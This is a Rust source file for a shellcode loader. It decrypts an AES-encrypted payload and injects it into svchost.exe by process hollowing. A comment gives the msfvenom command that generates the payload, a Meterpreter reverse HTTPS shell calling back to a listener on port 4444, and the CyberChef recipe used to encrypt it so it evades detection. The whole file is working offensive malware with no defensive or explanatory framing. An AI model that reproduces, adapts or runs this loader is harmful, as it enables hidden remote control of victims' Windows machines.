use libaes::Cipher;
use process_injection::*;

fn main() {
    let key: [u8; 16] = [
        0x4f, 0x20, 0x08, 0xd7, 0x2f, 0x29, 0xb5, 0xec, 0x5c, 0xc3, 0xbf, 0xef, 0x6f, 0x99, 0xbb,
        0xbd,
    ];
    let iv: [u8; 16] = [
        0x00, 0xc9, 0x13, 0x92, 0xb6, 0x5d, 0xaa, 0xd1, 0xc9, 0xb9, 0x68, 0x2b, 0x0f, 0x7c, 0x58,
        0xd8,
    ];

    // generate payload with msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.11 LPORT=4444 -f rust
    // encrypt with https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'4f%2020%2008%20d7%202f%2029%20b5%20ec%205c%20c3%20bf%20ef%206f%2099%20bb%20bd'%7D,%7B'option':'Hex','string':'00%20c9%2013%2092%20b6%205d%20aa%20d1%20c9%20b9%2068%202b%200f%207c%2058%20d8'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Hex('0x%20with%20comma',0)
    let shellcode_encrypted: [u8; 736] = [
        0x9c, 0x89, 0x99, 0x74, 0x60, 0xad, 0x43, 0xfd, 0xf7, 0x24, 0x39, 0xac, 0xde, 0x97, 0x71,
        0x63, 0x26, 0xee, 0x0e, 0x91, 0xa9, 0x27, 0xe5, 0x58, 0xb1, 0xe9, 0xdf, 0xe9, 0xfc, 0xee,
        0x0c, 0xac, 0xfa, 0x0f, 0x8f, 0xf7, 0x01, 0x49, 0xd9, 0x19, 0x5e, 0x27, 0x72, 0xba, 0xc0,
        0x3a, 0xd7, 0xec, 0x83, 0x8b, 0x78, 0x40, 0x85, 0xf6, 0x4f, 0xbb, 0x04, 0x33, 0xee, 0xb4,
        0x05, 0xaf, 0x80, 0x5d, 0x29, 0xd7, 0x37, 0xc6, 0xed, 0x85, 0x32, 0x67, 0x96, 0xab, 0x7b,
        0x85, 0xa1, 0x43, 0x2e, 0x72, 0xe1, 0x81, 0xf5, 0xa7, 0x9c, 0x9e, 0x33, 0xb1, 0x6c, 0x0c,
        0x1d, 0x0a, 0x13, 0x0f, 0x5e, 0x53, 0x7a, 0xdf, 0xd2, 0x1e, 0x77, 0xbb, 0x7b, 0x75, 0x1f,
        0xb1, 0xb4, 0x6e, 0x2f, 0x1d, 0x44, 0x4b, 0x18, 0x03, 0xad, 0x76, 0x40, 0x3f, 0x46, 0xcf,
        0xe2, 0xfb, 0x1e, 0xab, 0xaa, 0xd6, 0xea, 0x28, 0x71, 0x56, 0x77, 0xbb, 0xaf, 0x4f, 0xc1,
        0xc8, 0x5f, 0xb6, 0xc0, 0xfc, 0x8a, 0x99, 0x8d, 0xf7, 0x1d, 0xf7, 0xd0, 0x87, 0x36, 0xb0,
        0xb0, 0x5d, 0xfe, 0x21, 0x12, 0x73, 0x8e, 0x7f, 0x0e, 0xb7, 0xd8, 0xc8, 0x74, 0x83, 0xfa,
        0x72, 0x67, 0x44, 0xea, 0xd1, 0x9b, 0x8b, 0xb2, 0x82, 0xbe, 0x1d, 0xc1, 0x56, 0x0b, 0x28,
        0x94, 0x9c, 0xaa, 0x76, 0x17, 0xf5, 0xc9, 0x13, 0xa4, 0x94, 0xd5, 0xab, 0xc1, 0x88, 0x48,
        0x6e, 0xfc, 0x46, 0x0d, 0x37, 0x17, 0x6d, 0x75, 0x65, 0x04, 0x87, 0x86, 0xb5, 0xf5, 0x93,
        0xba, 0x03, 0x17, 0x75, 0xe9, 0x94, 0x57, 0x29, 0x4e, 0x60, 0xcc, 0x51, 0x6d, 0xb7, 0xe8,
        0x86, 0xfc, 0x13, 0xc1, 0x59, 0xa9, 0x84, 0x4b, 0xbb, 0x9c, 0x42, 0x18, 0x34, 0x32, 0x27,
        0x32, 0x71, 0x83, 0x14, 0x9d, 0x75, 0x60, 0x80, 0x58, 0xe3, 0x98, 0xe3, 0xd6, 0x6b, 0x27,
        0x13, 0x7c, 0x7b, 0xe3, 0x33, 0x4d, 0x80, 0xbc, 0x6e, 0x05, 0x13, 0x3a, 0x3c, 0x0f, 0xc5,
        0x7d, 0x61, 0x01, 0x78, 0x9c, 0xbf, 0x1c, 0x59, 0x23, 0x25, 0x36, 0x8d, 0x9c, 0x31, 0x5c,
        0x0f, 0xd1, 0x90, 0x90, 0xf2, 0xd6, 0x35, 0x15, 0x3a, 0x6f, 0x61, 0x7f, 0x61, 0x5d, 0xea,
        0x30, 0xa9, 0x63, 0xe1, 0xcf, 0xb9, 0xa5, 0x4e, 0x79, 0x3e, 0x8a, 0xaf, 0x4b, 0xd1, 0x0c,
        0x7d, 0xfa, 0xdf, 0x4e, 0xbf, 0x7a, 0xec, 0x75, 0xd7, 0xfc, 0x11, 0x58, 0x6f, 0xc0, 0x4a,
        0xeb, 0x86, 0xed, 0xa7, 0x5f, 0xfb, 0xc4, 0xce, 0xc2, 0x4b, 0x0d, 0x49, 0x44, 0x7b, 0x2d,
        0x6d, 0x31, 0x59, 0x54, 0x62, 0xa0, 0x80, 0xfd, 0xf6, 0x46, 0x50, 0x3b, 0x96, 0xdf, 0xc7,
        0xdf, 0xed, 0x85, 0x2f, 0xcd, 0xe9, 0x90, 0xcb, 0x26, 0x39, 0x91, 0xf7, 0xed, 0xc9, 0xa8,
        0xf6, 0xbe, 0xf4, 0xa5, 0x11, 0xe3, 0xd3, 0x23, 0xf1, 0x0a, 0x87, 0x65, 0x48, 0x65, 0xd8,
        0x72, 0x4a, 0xe9, 0xea, 0xc2, 0x46, 0x29, 0x21, 0xc5, 0xaf, 0xbd, 0x7c, 0xf4, 0x55, 0x17,
        0x3d, 0x0f, 0xa4, 0xf7, 0xd2, 0x6a, 0x93, 0xbc, 0xf7, 0x39, 0x41, 0xc0, 0xf2, 0xbc, 0xae,
        0x55, 0x90, 0x8e, 0x03, 0x5f, 0xc2, 0xca, 0xc8, 0xda, 0xc7, 0xa7, 0x67, 0x57, 0x14, 0xaa,
        0xb6, 0x99, 0x99, 0x8f, 0x29, 0x23, 0x83, 0x91, 0x42, 0xdf, 0xe9, 0x91, 0x4b, 0x7f, 0x0e,
        0xa6, 0xae, 0x9e, 0x23, 0x62, 0x1a, 0x26, 0x51, 0x8e, 0x43, 0x30, 0xf3, 0xe6, 0x24, 0xeb,
        0xf5, 0x8a, 0xb1, 0x99, 0x11, 0xe1, 0x8c, 0x82, 0xde, 0x51, 0x06, 0x1e, 0x07, 0xcf, 0x05,
        0xdb, 0xdc, 0xcc, 0xf2, 0xdb, 0xce, 0x4f, 0xe8, 0x49, 0x1d, 0xad, 0xe7, 0x35, 0x21, 0x87,
        0x47, 0x86, 0x44, 0xe5, 0xbd, 0xb0, 0x8b, 0xf0, 0x44, 0xd7, 0x20, 0xfe, 0x8d, 0x82, 0x6f,
        0xca, 0xd7, 0xad, 0x16, 0x36, 0x39, 0x95, 0x84, 0xd4, 0xa4, 0x50, 0x98, 0xc2, 0xaf, 0xde,
        0xb9, 0x4f, 0xc1, 0x9a, 0x60, 0xff, 0xb8, 0x6e, 0x6a, 0xf2, 0x15, 0xf1, 0x72, 0xe6, 0xcf,
        0xa5, 0x77, 0xeb, 0x2d, 0x63, 0x5f, 0x21, 0x69, 0x88, 0xec, 0xc2, 0x15, 0xeb, 0x16, 0xce,
        0x31, 0x41, 0xdd, 0xc9, 0x10, 0xb5, 0x82, 0x65, 0x43, 0xf7, 0xa6, 0xea, 0xe0, 0x4c, 0x6a,
        0xcb, 0xbe, 0xf5, 0xc8, 0xbf, 0x4c, 0xe3, 0xaa, 0x2d, 0x00, 0xc8, 0x60, 0x16, 0x02, 0x9a,
        0xd8, 0x06, 0x93, 0x1f, 0xb5, 0x99, 0x64, 0xd1, 0x73, 0xa0, 0xfb, 0x22, 0x3d, 0xad, 0x8f,
        0x43, 0xde, 0x7d, 0xf5, 0x21, 0xae, 0x31, 0xcc, 0x56, 0x36, 0xa8, 0x60, 0x00, 0x76, 0x33,
        0xd5, 0x29, 0x69, 0x27, 0x8b, 0xe6, 0x7a, 0xad, 0x64, 0xe0, 0x4a, 0xa6, 0x21, 0x92, 0x9d,
        0x53, 0x84, 0x4e, 0x8c, 0xbe, 0xd0, 0xd4, 0x86, 0x62, 0x35, 0xde, 0xcc, 0xd8, 0x5f, 0x97,
        0xe9, 0x26, 0xab, 0x7f, 0x1f, 0xbb, 0x7d, 0xca, 0xc2, 0x79, 0x9f, 0x24, 0xb6, 0x6f, 0x47,
        0x40, 0xcd, 0x86, 0xbe, 0x44, 0x86, 0x52, 0xec, 0x4c, 0xe0, 0xc8, 0x99, 0x10, 0x8b, 0x9d,
        0xd7, 0xd6, 0xb0, 0x50, 0xe5, 0x5e, 0x04, 0x80, 0x08, 0x96, 0x60, 0xeb, 0x5b, 0x1c, 0xd3,
        0x96, 0x08, 0xac, 0xec, 0xf7, 0xfd, 0x29, 0xa3, 0xd8, 0x59, 0xba, 0x24, 0xbb, 0xb9, 0xd4,
        0x1d, 0x04, 0x48, 0x1d, 0xf4, 0x3a, 0xa8, 0xd8, 0x22, 0xe2, 0x15, 0xbf, 0x9f, 0x6b, 0xd5,
        0x8d, 0x1b, 0x7e, 0x03, 0x7d, 0x08, 0x0d, 0xf9, 0x19, 0x60, 0xfb, 0x36, 0xc0, 0x28, 0x61,
        0xc2,
    ];

    let cipher = Cipher::new_128(&key);
    let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);

    let exe_path = "C:\\Windows\\System32\\svchost.exe".to_string();
    match inject_hollow(exe_path, buf) {
        Ok(()) => println!("Process has been injected."),
        Err(e) => println!("Error during injection: {:?}", e),
    }
}
